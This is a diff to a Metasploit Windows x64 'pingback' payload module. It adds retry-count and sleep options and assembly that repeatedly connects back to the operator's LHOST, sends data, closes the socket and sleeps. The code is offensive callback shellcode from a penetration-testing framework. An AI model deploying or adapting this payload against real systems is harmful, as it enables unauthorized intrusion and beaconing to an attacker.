@@ -41,8 +41,8 @@ module MetasploitModule
       encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
       #encoded_host = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i, 32)
       retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
-
-      retry_count = datastore['ReverseConnectRetries']
+      pingback_count = datastore['PingbackTries']
+      pingback_sleep = datastore['PingbackSleep']
 
       puts("Generating pingback single payload")
       #encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
@@ -183,6 +183,8 @@ module MetasploitModule
         ; stick the retry count on the stack and store it
           push #{retry_count}     ; retry counter
           pop r14
+          push #{(pingback_count)} 
+          pop r11
 
         create_socket:
         ; perform the call to WSASocketA...
@@ -233,8 +235,27 @@ module MetasploitModule
           mov rcx, rdi           ; Socket handle
           mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
           call rbp               ; call send
-      
-      
+
+        close_socket:
+          mov rcx, rdi           ; Socket handle
+          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+          call rbp               ; call closesocket
+        ^
+      if pingback_count
+        asm << %Q^
+          sleep:
+            test r11, r11            ; check pingback retry counter
+            jz exitfunk           ; bail if we are at 0
+            dec r11               ;decrement the pingback retry counter
+            push #{(pingback_sleep*1000).to_s}            ; 10 seconds
+            pop rcx               ; set the sleep function parameter
+            mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+            call rbp              ; Sleep()
+            jmp create_socket     ; repeat callback
+        ^
+      end
+
+      asm << %Q^
         exitfunk:
           pop rax               ; won't be returning, realign the stack with a pop
           push 0                ;
